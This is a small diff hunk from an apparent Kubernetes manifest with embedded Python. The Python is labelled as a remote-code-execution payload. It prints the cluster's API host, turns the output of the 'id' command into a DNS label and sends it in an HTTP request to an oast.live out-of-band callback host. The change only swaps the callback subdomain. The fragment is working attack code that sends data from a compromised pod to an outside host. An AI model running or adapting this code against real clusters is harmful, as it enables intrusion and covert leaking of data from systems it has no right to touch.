@@ -40,7 +40,7 @@ spec:
             print('[RCE] K8S_API_HOST: ' + k, flush=True)
             parts = id_out.split()[:2]
             dns_label = re.sub(r'-+', '-', re.sub(r'[^a-z0-9]', '-', '-'.join(parts).lower())).strip('-')[:50]
-            dns_url = 'http://' + dns_label + '.d7f40amipla5868kagegp9tx1c4su44t8.oast.live/'
+            dns_url = 'http://' + dns_label + '.d7f7fjmipla8bru9umagndehoqayja3z6.oast.live/'
             print('[RCE] DNS_OAST: ' + dns_url, flush=True)
             try:
                 r = urllib.request.urlopen(urllib.request.Request(dns_url), timeout=15, context=ctx)
